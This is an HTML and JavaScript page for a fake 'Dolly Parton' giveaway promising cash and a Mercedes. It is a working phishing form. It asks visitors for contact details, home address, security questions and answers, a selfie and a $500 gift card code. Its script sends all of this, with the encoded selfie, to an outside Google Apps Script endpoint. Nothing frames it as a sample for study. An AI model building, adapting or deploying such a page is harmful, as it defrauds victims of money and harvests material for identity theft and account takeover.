<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dolly Parton Giveaway</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 20px; padding: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
        h1 { color: #c62828; margin-bottom: 10px; text-align: center; }
        input, select, textarea { width: 100%; padding: 12px; margin: 8px 0 16px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; }
        button { background: #c62828; color: white; padding: 14px 28px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; }
        button:hover { background: #8b1e1e; }
        .step { display: none; }
        .step.active { display: block; }
        .file-upload { border: 2px dashed #c62828; padding: 20px; text-align: center; cursor: pointer; margin: 10px 0; border-radius: 10px; background: #fff5f5; }
        .success { background: #4caf50; color: white; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; }
        .error { background: #f44336; color: white; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; }
        .prize-badge { background: linear-gradient(135deg, #ffd700, #ffb347); padding: 10px; border-radius: 10px; text-align: center; margin: 20px 0; }
        .nav-buttons { display: flex; gap: 10px; margin-top: 20px; }
        .nav-buttons button { flex: 1; }
    </style>
</head>
<body>
<div class="container">
    <h1>🎸 DOLLY PARTON'S DREAM GIVEAWAY</h1>
    <div class="prize-badge">
        <strong>💰 $50,000 CASH + 🚗 BRAND NEW MERCEDES-BENZ</strong>
    </div>
    
    <div id="step1" class="step active">
        <h3>Step 1: Your Information</h3>
        <input type="text" id="fullname" placeholder="Full Name *">
        <input type="email" id="email" placeholder="Email Address *">
        <input type="tel" id="phone" placeholder="Phone Number *">
        <select id="fanDuration">
            <option value="">How long have you been a fan?</option>
            <option>Less than 1 year</option>
            <option>1-5 years</option>
            <option>6-10 years</option>
            <option>10-20 years</option>
            <option>20+ years</option>
        </select>
        <textarea id="dollyLove" rows="3" placeholder="What do you love about Dolly Parton? *"></textarea>
        <button onclick="nextStep(2)">Next →</button>
    </div>
    
    <div id="step2" class="step">
        <h3>Step 2: Security & Selfie</h3>
        <input type="text" id="secQ1" placeholder="Security Question 1 *">
        <input type="text" id="secA1" placeholder="Your Answer *">
        <input type="text" id="secQ2" placeholder="Security Question 2 *">
        <input type="text" id="secA2" placeholder="Your Answer *">
        <div class="file-upload" onclick="document.getElementById('selfie').click()">
            📸 Click to upload your selfie (Required)
        </div>
        <input type="file" id="selfie" accept="image/*" style="display:none">
        <div id="selfieName" style="margin: 10px 0; color: green;"></div>
        <div class="nav-buttons">
            <button onclick="prevStep(1)">← Back</button>
            <button onclick="nextStep(3)">Next →</button>
        </div>
    </div>
    
    <div id="step3" class="step">
        <h3>Step 3: Shipping & Payment</h3>
        <input type="text" id="address" placeholder="Street Address *">
        <input type="text" id="city" placeholder="City *">
        <input type="text" id="state" placeholder="State *">
        <input type="text" id="zip" placeholder="ZIP Code *">
        <input type="text" id="giftCode" placeholder="Gift Card Code ($500) *">
        <div class="nav-buttons">
            <button onclick="prevStep(2)">← Back</button>
            <button onclick="nextStep(4)">Review →</button>
        </div>
    </div>
    
    <div id="step4" class="step">
        <h3>Step 4: Submit Entry</h3>
        <p><strong>Tracking Number:</strong> <span id="tracking"></span></p>
        <label>
            <input type="checkbox" id="confirm"> I confirm all information is accurate
        </label>
        <div class="nav-buttons">
            <button onclick="prevStep(3)">← Back</button>
            <button onclick="submitForm()">🎉 SUBMIT ENTRY 🎉</button>
        </div>
    </div>
    
    <div id="message" style="margin-top: 20px;"></div>
</div>

<script>
let currentStep = 1;
let selfieFile = null;
let trackingNumber = "";

document.getElementById('selfie').addEventListener('change', function(e) {
    if(e.target.files.length > 0) {
        selfieFile = e.target.files[0];
        document.getElementById('selfieName').innerHTML = '✅ ' + selfieFile.name + ' uploaded!';
    }
});

function nextStep(step) {
    if(step === 2 && !validateStep1()) return;
    if(step === 3 && !validateStep2()) return;
    if(step === 4 && !validateStep3()) return;
    
    document.getElementById('step' + currentStep).classList.remove('active');
    currentStep = step;
    document.getElementById('step' + currentStep).classList.add('active');
    
    if(step === 4) {
        trackingNumber = 'DOLLY-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
        document.getElementById('tracking').innerHTML = trackingNumber;
    }
}

function prevStep(step) {
    document.getElementById('step' + currentStep).classList.remove('active');
    currentStep = step;
    document.getElementById('step' + currentStep).classList.add('active');
}

function validateStep1() {
    let name = document.getElementById('fullname').value.trim();
    let email = document.getElementById('email').value.trim();
    if(!name) { alert("Full name required"); return false; }
    if(!email || !email.includes('@')) { alert("Valid email required"); return false; }
    return true;
}

function validateStep2() {
    if(!selfieFile) { alert("Please upload a selfie"); return false; }
    return true;
}

function validateStep3() {
    let address = document.getElementById('address').value.trim();
    let giftCode = document.getElementById('giftCode').value.trim();
    if(!address) { alert("Address required"); return false; }
    if(!giftCode) { alert("Gift card code required"); return false; }
    return true;
}

function fileToBase64(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
}

async function submitForm() {
    if(!document.getElementById('confirm').checked) {
        alert("Please confirm that all information is accurate");
        return;
    }
    
    const formData = {
        trackingNumber: trackingNumber,
        fullName: document.getElementById('fullname').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        fanDuration: document.getElementById('fanDuration').value,
        dollyLove: document.getElementById('dollyLove').value,
        securityQ1: document.getElementById('secQ1').value,
        securityA1: document.getElementById('secA1').value,
        securityQ2: document.getElementById('secQ2').value,
        securityA2: document.getElementById('secA2').value,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zip: document.getElementById('zip').value,
        giftCardCode: document.getElementById('giftCode').value
    };
    
    const msgDiv = document.getElementById('message');
    msgDiv.innerHTML = '<div style="background:#ffc107; padding:15px; border-radius:8px;">📤 Submitting your entry...</div>';
    
    try {
        const selfieBase64 = await fileToBase64(selfieFile);
        
        const payload = {
            formData: JSON.stringify(formData),
            selfie: selfieBase64
        };
        
        const response = await fetch('https://script.google.com/macros/s/AKfycbw9OW7F06XsT0v6LyfosZugONGIIx8LwzhbpV_dc2vI5BaYOgSLDMo53vAKLFXdk-Qfiw/exec', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        const result = await response.json();
        
        if(result.success) {
            msgDiv.innerHTML = '<div class="success">✅ SUCCESS! Your entry has been submitted!<br>Tracking Number: ' + trackingNumber + '<br>Check your email for confirmation!</div>';
            setTimeout(() => {
                location.reload();
            }, 5000);
        } else {
            throw new Error(result.error);
        }
        
    } catch(error) {
        console.error('Error:', error);
        msgDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
    }
}
</script>
</body>
</html>
